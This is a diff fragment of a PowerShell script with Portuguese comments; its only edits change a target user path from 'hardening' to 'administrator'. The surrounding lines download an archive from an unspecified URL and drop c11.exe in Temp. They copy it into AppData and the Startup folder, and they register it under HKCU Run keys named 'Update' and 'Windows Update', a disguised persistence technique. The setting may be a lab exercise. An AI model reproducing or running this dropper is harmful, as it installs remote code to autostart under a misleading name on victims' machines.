@@ -8,9 +8,9 @@ Invoke-WebRequest -Uri $url -OutFile $d
 
 Expand-Archive -Path "C:\Windows\Temp\c11.zip" -DestinationPath "C:\Windows\Temp\c11.exe"
 
-copy "C:\Windows\Temp\c11.exe" "C:\Users\hardening\AppData\Roaming\"
+copy "C:\Windows\Temp\c11.exe" "C:\Users\administrator\AppData\Roaming\"
 
-copy "C:\Windows\Temp\c11.exe" "C:\Users\hardening\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\c11.exe"
+copy "C:\Windows\Temp\c11.exe" "C:\Users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\c11.exe"
 
 Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile "C:\users\$env:USERNAME\Downloads\SysinternalsSuite.zip"
 
@@ -26,7 +26,7 @@ Set-ItemProperty -Path $registryPath1 -Name "Update" -Value $registryValue1
 
 Chave de registro HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update
 $registryPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$registryValue2 = "C:\Users\hardening\AppData\Roaming\c11.exe"
+$registryValue2 = "C:\Users\administrator\AppData\Roaming\c11.exe"
 Set-ItemProperty -Path $registryPath2 -Name "Windows Update" -Value $registryValue2
 
 Defina o caminho para o arquivo que deseja executar
